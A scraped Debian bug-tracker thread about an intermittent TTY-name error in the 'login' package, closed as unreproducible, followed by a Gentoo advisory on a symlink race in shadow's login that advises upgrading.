![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Christian Perrier <bubulle@debian.org>
Cc: 332198@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Thu, 9 Feb 2006 06:55:36 +0100
```
On Tue, Feb 07, 2006 at 06:43:29PM +0100, Christian Perrier <bubulle@debian.org> wrote:
> > > patch. It should give us more clue about what really
> > > happens.
> >
> > I installed them and will have a look in the future. Thanks!
>
>
> Marc,
>
> Have you again been hit by this bug?

Unfotunately(?) not (it can be weeks or months in between, and then I
cna get a lot of failure sin a row). However, I can't seem to get much
mor elogging, either, but I assume this is because it only logs unusual
things (failures :)?

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=127), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=127), [link](#126)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=129), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=129), [link](#128)).

---

[Message #130](#130) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=130), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=130), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Christian Perrier <bubulle@debian.org>
Cc: 332198@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 11 Feb 2006 00:11:07 +0100
```
On Tue, Feb 07, 2006 at 06:43:29PM +0100, Christian Perrier <bubulle@debian.org> wrote:
>
> > I installed them and will have a look in the future. Thanks!
>
> Marc,
>
> Have you again been hit by this bug?

Just now after a long time of it working:

Feb 11 00:08:15 cerebro pam_rhosts_auth[511]: allowed to root@fuji as root
Feb 11 00:08:16 cerebro login[512]: (pam_unix) session opened for user root by (uid=0)
Feb 11 00:08:16 cerebro login[512]: `/dev/pts/2'.st_rdev(136,2) != stdin.st_rdev(136,1)
Feb 11 00:08:16 cerebro login[512]: unable to determine TTY name, got /dev/pts/2

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=132), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=132), [link](#131)).

---

**Acknowledgement sent** to `Christian Perrier <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=134), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=134), [link](#133)).

---

[Message #135](#135) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=135), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=135), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: 332198@bugs.debian.org, Alexander Gattin <xrgtn@yandex.ru>
Subject: Ping for #332198
Date: Wed, 10 May 2006 10:13:40 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=332198;msg=135) (text/plain, inline)]
```
```
Alex, in #332198, the bug submitter reported a failure on Feb 11th
with some extra output because of the patch you added, that allows mor
elogging to occur.

Could this be investigated again?

--

```
```
[[signature.asc](bugreport.cgi?att=1;bug=332198;filename=signature.asc;msg=135) (application/pgp-signature, inline)]
```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=137), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=137), [link](#136)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=139), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=139), [link](#138)).

---

[Message #140](#140) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=140), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=140), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: Christian Perrier <bubulle@debian.org>
Cc: 332198@bugs.debian.org
Subject: Re: Ping for #332198
Date: Fri, 12 May 2006 23:06:46 +0300
```
Hi!

On Wed, May 10, 2006 at 10:13:40AM +0200, Christian Perrier wrote:
> Could this be investigated again?

IMHO the bug is related to utmp corruption.
Right now I'm not quite ready to debug the issue deeper
as I don't know how exactly is the utmp is used in
Unices.

I'll try to come up with some idea until June.

--
WBR,
xrgtn

```

---

**Reply sent** to `Christian Perrier <bubulle@debian.org>`:

You have taken responsibility.
([full text](bugreport.cgi?bug=332198;msg=142), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=142), [link](#141)).

---

**Notification sent** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug acknowledged by developer.
([full text](bugreport.cgi?bug=332198;msg=144), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=144), [link](#143)).

---

[Message #145](#145) received at 332198-done@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=145), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=145), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: 332198-done@bugs.debian.org
Subject: CLosing this unreproducible bug
Date: Sat, 16 Jun 2007 15:15:10 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=332198;msg=145) (text/plain, inline)]
```
```
This bug is impossible to reproduce and it is more than 1 year since
we got news about it.

Unless the issue ir really affecting you *now*, I suggest not
reopening it.

--

```
```
[[signature.asc](bugreport.cgi?att=1;bug=332198;filename=signature.asc;msg=145) (application/pgp-signature, inline)]
```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 15 Jul 2007 07:32:33 GMT) ([full text](bugreport.cgi?bug=332198;msg=147), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=147), [link](#146)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=332198).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 15:17:51 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from security.gentoo.org_2f90f246_20250125_151803.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Shadow: Privilege escalation — GLSA **200903-24**

An insecure temporary file usage in Shadow may allow local users to gain
root privileges.

### Affected packages

| Package | **sys-apps/shadow** on all architectures |
| --- | --- |
| Affected versions | < **4.1.2.2** |
| Unaffected versions | >= **4.1.2.2** |

### Background

Shadow is a set of tools to deal with user accounts.

### Description

Paul Szabo reported a race condition in the "login" executable when
setting up tty permissions.

### Impact

A local attacker belonging to the "utmp" group could use symlink
attacks to overwrite arbitrary files and possibly gain root privileges.

### Workaround

There is no known workaround at this time.

### Resolution

All Shadow users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/shadow-4.1.2.2"
```
### References

* [CVE-2008-5394](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5394)

**Release date**

March 10, 2009

**Latest revision**

March 10, 2009: 01

**Severity**

high

**Exploitable**

local

**Bugzilla entries**

* [251320](https://bugs.gentoo.org/show_bug.cgi?id=251320)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


